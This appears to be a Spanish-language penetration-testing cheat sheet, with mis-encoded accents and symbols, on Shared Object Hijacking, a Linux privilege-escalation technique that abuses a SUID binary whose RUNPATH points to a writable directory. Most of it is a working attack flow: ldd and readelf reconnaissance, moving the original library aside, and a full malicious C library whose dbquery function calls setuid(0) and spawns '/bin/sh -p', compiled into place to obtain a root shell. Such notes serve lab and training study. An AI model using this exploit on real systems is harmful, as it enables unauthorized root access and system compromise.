## üõ†Ô∏è **Shared Object Hijacking**

### üî¥ **¬øQu√© es?**

**Shared Object Hijacking** es una t√©cnica de escalada de privilegios que explota binarios din√°micos mal configurados que cargan librer√≠as compartidas (`.so`) desde rutas inseguras o controladas por el atacante.

Si un binario busca una librer√≠a espec√≠fica en una ruta **writable** (como `/tmp` o `/development`), un atacante puede colocar una versi√≥n maliciosa de la `.so` con **el mismo nombre** y exportar las funciones que el binario espera, ejecutando c√≥digo arbitrario.

### üß© **Condiciones necesarias**

1. **Binario din√°mico** que cargue `.so`.
2. Uso de **RUNPATH** o **RPATH** hacia un directorio **writable** por usuarios no privilegiados.
3. Binario vulnerable que:
    - **Es SUID root** o se ejecuta con permisos elevados.
    - **Carga la `.so` autom√°ticamente** como dependencia.

### ‚öôÔ∏è **Flujo de ataque**

1. **Detectar librer√≠as cargadas**:
	```bash
	ldd ./payroll
```
- Busca `.so` en rutas personalizadas como `/development/libshared.so`.

2. Verificar RUNPATH
```bash
readelf -d ./payroll | grep RUNPATH

```
- Confirmas que `/development` es parte del `RUNPATH`.

3. **Renombrar o eliminar la `.so` original**:
```bash
mv /development/libshared.so /development/libshared.so.bak
```
4. **Ejecutar el binario y capturar el s√≠mbolo faltante**:`./payroll`
Aparecer√° un error como:

```javascript
undefined symbol: dbquery
```
5. **Crear librer√≠a maliciosa con la funci√≥n requerida**:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}

```
6. **Compilar y colocar la `.so` maliciosa**:
```bash
gcc src.c -fPIC -shared -o /development/libshared.so

```

7. **Ejecutar el binario y obtener root**:

```bash
./payroll

```